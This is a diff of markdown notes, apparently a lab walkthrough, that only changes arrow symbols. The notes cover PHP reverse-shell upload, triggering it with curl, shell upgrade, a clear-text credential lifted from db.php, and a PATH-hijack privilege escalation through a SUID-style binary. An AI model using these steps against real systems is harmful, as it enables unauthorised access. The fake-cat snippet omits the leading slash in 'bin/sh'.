@@ -25,9 +25,9 @@
 - foothold
 	- upload php reverse shell from superadmin
 	- find where the files got uploaded
-		- fuzz with [[dirsearch]] -> in /uploads
+		- fuzz with [[dirsearch]] → in /uploads
 	- `curl http://<IP>/uploads/<file_name>`
-		- -> get shell
+		- → get shell
 		- upgrade:	
 		```
 		SHELL=/bin/bash script -q /dev/null
@@ -39,24 +39,24 @@
 		```
 	- find user flag
 
-- privilege escalation (part1- www-data => robert)
-	- `sudo -l` => nothing
+- privilege escalation (part1- www-data → robert)
+	- `sudo -l` → nothing
 	- find creds for the user running the webapp
 		- search file structure in `/var/ww/...`
 		- `db.php` file in `/var/www/html/cdn-cgi/login`
 		- default creds: `robert:M3g4C0rpUs3r!`
 
-- privilege escalation (part2 robert => root)
+- privilege escalation (part2 robert → root)
 		- `su robert`
 		- `id` - got more info about robert
-			- find all files that belong to group that robert is in `find / -type f -group bugtracker` => /usr/bin/bugtracker binary
+			- find all files that belong to group that robert is in `find / -type f -group bugtracker` → /usr/bin/bugtracker binary
 			- it runs cat on some file
-		- => create bogus cat in PATH  
+		- → create bogus cat in PATH  
 		```
 		export PATH=/tmp:$PATH
 		cd /tmp/
 		echo 'bin/sh' > cat
 		chmod +x cat
 		```
-		- run the binary again => you get shell
+		- run the binary again → you get shell
 			- find the flag
